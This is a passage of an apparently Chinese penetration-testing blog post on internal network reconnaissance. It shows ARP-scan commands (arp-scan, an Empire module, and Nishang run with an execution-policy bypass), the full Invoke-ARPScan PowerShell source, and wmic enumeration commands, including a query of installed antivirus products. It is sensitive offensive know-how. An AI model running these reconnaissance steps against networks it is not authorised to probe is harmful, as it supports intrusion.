</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span> </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line">#cscript <span class="number">1.</span>vps 执行</span><br></pre></td></tr></table></figure><h3 id="11-ARP扫描探测内网"><a href="#11-ARP扫描探测内网" class="headerlink" title="11.ARP扫描探测内网"></a>11.ARP扫描探测内网</h3><h4 id="01-arp-scan扫描工具"><a href="#01-arp-scan扫描工具" class="headerlink" title="01.arp-scan扫描工具"></a>01.arp-scan扫描工具</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><h4 id="02-Empire中的arpscan模块"><a href="#02-Empire中的arpscan模块" class="headerlink" title="02.Empire中的arpscan模块"></a>02.Empire中的arpscan模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><h4 id="03-Nishang中的Invoke-ARPScan-ps1"><a href="#03-Nishang中的Invoke-ARPScan-ps1" class="headerlink" title="03.Nishang中的Invoke-ARPScan.ps1"></a>03.Nishang中的Invoke-ARPScan.ps1</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;&amp; &#123;Import-Module C:\Users\Administrator\Desktop\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24&#125;&quot; &gt;&gt; C:\Users\Administrator\Desktop\Result.txt</span><br></pre></td></tr></table></figure><p><code>Invoke-ARPScan.ps1如下</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ARPScan</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment">   Part of Posh-SecMod (https://github.com/darkoperator/Posh-SecMod/)</span></span><br><span class="line"><span class="comment">   Author: darkoperator</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">   Invoke an ARP Scan against a range of IPs specified in CIDR Format</span></span><br><span class="line"><span class="comment">    PS C:\&gt; Invoke-ARPScan -CIDR 172.20.10.1/24</span></span><br><span class="line"><span class="comment">    MAC                                                       Address                                                  </span></span><br><span class="line"><span class="comment">    ---                                                       -------                                                  </span></span><br><span class="line"><span class="comment">    14:10:9F:D5:1A:BF                                         172.20.10.2                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.3                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.15  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    <span class="keyword">param</span> (</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;Range&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$Range</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;CIDR&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$CIDR</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$false</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$MaxThreads</span>=<span class="number">50</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Begin</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4Range</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$StartIP</span>,</span><br><span class="line">                           </span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">2</span>)]</span><br><span class="line">                           <span class="variable">$EndIP</span>          </span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># created by Dr. Tobias Weltner, MVP PowerShell</span></span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip1</span>)</span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip1</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip2</span>)</span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip2</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="variable">$ip1</span>; <span class="variable">$x</span> <span class="operator">-le</span> <span class="variable">$ip2</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$x</span>).GetAddressBytes()</span><br><span class="line">                [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip</span>)</span><br><span class="line">                <span class="variable">$ip</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4RangeFromCIDR</span> </span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$Network</span></span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># Extract the portions of the CIDR that will be needed</span></span><br><span class="line">            <span class="variable">$StrNetworkAddress</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">0</span>]</span><br><span class="line">            [<span class="built_in">int</span>]<span class="variable">$NetworkLength</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">1</span>]</span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StrNetworkAddress</span>).GetAddressBytes()</span><br><span class="line">            <span class="variable">$IPLength</span> = <span class="number">32</span>-<span class="variable">$NetworkLength</span></span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$NetworkIP</span>)</span><br><span class="line">            <span class="variable">$NumberOfIPs</span> = ([<span class="type">System.Math</span>]::Pow(<span class="number">2</span>, <span class="variable">$IPLength</span>)) <span class="literal">-1</span></span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$NetworkIP</span> <span class="operator">-join</span> <span class="string">&quot;.&quot;</span>)).Address</span><br><span class="line">            <span class="variable">$StartIP</span> = <span class="variable">$NetworkIP</span> +<span class="number">1</span></span><br><span class="line">            <span class="variable">$EndIP</span> = <span class="variable">$NetworkIP</span> + <span class="variable">$NumberOfIPs</span></span><br><span class="line">            <span class="comment"># We make sure they are of type Double before conversion</span></span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$EndIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$EndIP</span> = <span class="variable">$EndIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$StartIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$StartIP</span> = <span class="variable">$StartIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># We turn the start IP and end IP in to strings so they can be used.</span></span><br><span class="line">            <span class="variable">$StartIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).IPAddressToString</span><br><span class="line">            <span class="variable">$EndIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).IPAddressToString</span><br><span class="line">            <span class="built_in">New-IPv4Range</span> <span class="variable">$StartIP</span> <span class="variable">$EndIP</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sign</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Collections.Generic;</span></span><br><span class="line"><span class="string">using System.Text;</span></span><br><span class="line"><span class="string">using System.Net;</span></span><br><span class="line"><span class="string">using System.Net.NetworkInformation;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public static class NetUtils</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [System.Runtime.InteropServices.DllImport(&quot;iphlpapi.dll&quot;, ExactSpelling = true)]</span></span><br><span class="line"><span class="string">    static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);</span></span><br><span class="line"><span class="string">    public static string GetMacAddress(String addr)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        try</span></span><br><span class="line"><span class="string">                &#123;                   </span></span><br><span class="line"><span class="string">                    IPAddress IPaddr = IPAddress.Parse(addr);</span></span><br><span class="line"><span class="string">                   </span></span><br><span class="line"><span class="string">                    byte[] mac = new byte[6];</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    int L = 6;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    SendARP(BitConverter.ToInt32(IPaddr.GetAddressBytes(), 0), 0, mac, ref L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    String macAddr = BitConverter.ToString(mac, 0, L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    return (macAddr.Replace(&#x27;-&#x27;,&#x27;:&#x27;));</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                catch (Exception ex)</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    return (ex.Message);              </span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;Instanciating NetUtils&quot;</span></span><br><span class="line">            <span class="variable">$IPHlp</span> = <span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="variable">$sign</span> <span class="literal">-Language</span> CSharp <span class="literal">-PassThru</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;NetUtils already instanciated&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if range is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Range</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$rangeips</span> = <span class="variable">$Range</span>.Split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4Range</span> <span class="literal">-StartIP</span> <span class="variable">$rangeips</span>[<span class="number">0</span>] <span class="literal">-EndIP</span> <span class="variable">$rangeips</span>[<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if CIDR is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CIDR</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4RangeFromCIDR</span> <span class="literal">-Network</span> <span class="variable">$CIDR</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Process</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$scancode</span> = &#123;</span><br><span class="line">            <span class="keyword">param</span>(<span class="variable">$IPAddress</span>,<span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$IPHlp::GetMacAddress</span>(<span class="variable">$IPAddress</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;<span class="built_in">New-Object</span> psobject <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;Address = <span class="variable">$IPAddress</span>; MAC = <span class="variable">$result</span>&#125;&#125;</span><br><span class="line">        &#125; <span class="comment"># end ScanCode var</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$start</span> = <span class="built_in">get-date</span></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Begin Scanning at <span class="variable">$start</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Multithreading setup</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a pool of maxThread runspaces   </span></span><br><span class="line">        <span class="variable">$pool</span> = [<span class="type">runspacefactory</span>]::CreateRunspacePool(<span class="number">1</span>, <span class="variable">$MaxThreads</span>)   </span><br><span class="line">        <span class="variable">$pool</span>.Open()</span><br><span class="line">  </span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$ps</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$wait</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># How many servers</span></span><br><span class="line">        <span class="variable">$record_count</span> = <span class="variable">$targets</span>.Length</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Loop through the endpoints starting a background job for each endpoint</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$IPAddress</span> <span class="keyword">in</span> <span class="variable">$targets</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># Show Progress</span></span><br><span class="line">            <span class="variable">$record_progress</span> = [<span class="built_in">int</span>][<span class="type">Math</span>]::Ceiling(((<span class="variable">$i</span> / <span class="variable">$record_count</span>) * <span class="number">100</span>))</span><br><span class="line">            <span class="comment"># Write-Progress -Activity &quot;Performing ARP Scan&quot; -PercentComplete $record_progress -Status &quot;Addresses Queried - $record_progress%&quot; -Id 1;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$pool</span>.GetAvailableRunspaces()) <span class="operator">-le</span> <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># create a &quot;powershell pipeline runner&quot;</span></span><br><span class="line">            <span class="variable">$ps</span> += [<span class="type">powershell</span>]::create()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># assign our pool of 3 runspaces to use   </span></span><br><span class="line">            <span class="variable">$ps</span>[<span class="variable">$i</span>].runspacepool = <span class="variable">$pool</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># command to run</span></span><br><span class="line">            [<span class="built_in">void</span>]<span class="variable">$ps</span>[<span class="variable">$i</span>].AddScript(<span class="variable">$scancode</span>).AddParameter(<span class="string">&#x27;IPaddress&#x27;</span>, <span class="variable">$IPAddress</span>).AddParameter(<span class="string">&#x27;IPHlp&#x27;</span>, <span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="comment">#[void]$ps[$i].AddParameter()</span></span><br><span class="line">    </span><br><span class="line">            <span class="comment"># start job</span></span><br><span class="line">            <span class="variable">$jobs</span> += <span class="variable">$ps</span>[<span class="variable">$i</span>].BeginInvoke();</span><br><span class="line">     </span><br><span class="line">            <span class="comment"># store wait handles for WaitForAll call   </span></span><br><span class="line">            <span class="variable">$wait</span> += <span class="variable">$jobs</span>[<span class="variable">$i</span>].AsyncWaitHandle</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$i</span>++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Waiting for scanning threads to finish...&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$waitTimeout</span> = <span class="built_in">get-date</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$jobs</span> | ? &#123;<span class="variable">$_</span>.IsCompleted <span class="operator">-eq</span> <span class="variable">$false</span>&#125;).count <span class="operator">-gt</span> <span class="number">0</span> <span class="operator">-or</span> <span class="variable">$</span>(<span class="variable">$</span>(<span class="variable">$</span>(<span class="built_in">get-date</span>) - <span class="variable">$waitTimeout</span>).totalSeconds) <span class="operator">-gt</span> <span class="number">60</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">        &#125; </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># end async call   </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> <span class="operator">-lt</span> <span class="variable">$i</span>; <span class="variable">$y</span>++) &#123;     </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> </span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="comment"># complete async job   </span></span><br><span class="line">                <span class="variable">$ScanResults</span> += <span class="variable">$ps</span>[<span class="variable">$y</span>].EndInvoke(<span class="variable">$jobs</span>[<span class="variable">$y</span>])   </span><br><span class="line">  </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">catch</span> </span><br><span class="line">            &#123;   </span><br><span class="line">       </span><br><span class="line">                <span class="built_in">write-warning</span> <span class="string">&quot;error: <span class="variable">$_</span>&quot;</span>  </span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">finally</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$ps</span>[<span class="variable">$y</span>].Dispose()</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pool</span>.Dispose()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ScanResults</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-wmic的简单使用"><a href="#0x03-wmic的简单使用" class="headerlink" title="0x03.wmic的简单使用"></a>0x03.wmic的简单使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wmic /?        #全局参数(帮助)</span><br><span class="line">wmic process /?        #进程参数(帮助)</span><br><span class="line">wmic process get /?        #属性获取操作帮助</span><br><span class="line">wmic process get caption,executablepath,processid    #获取当前运行进程、进程路径、进程id</span><br><span class="line">wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayname,productstate,pathtosignedproductexe</span><br><span class="line">wmic onboarddevice get description,devicetype,enable,status /format:list</span><br><span class="line">wmic product get name    #系统软件安装情况</span><br><span class="line">wmic environment get description,variablevalue    #查看系统环境变量</span><br><span class="line">wmic computersystem get name,domain,manufacturer,model,username,roles/format:list</span><br><span class="line">wmic sysdriver get caption,name,pathname,servicetype,state,status /format:list</span><br></pre></td></tr></table></figure><h2 id="0x04-域内端口探测"><a href="#0x04-域内端口探测" class="headerlink" 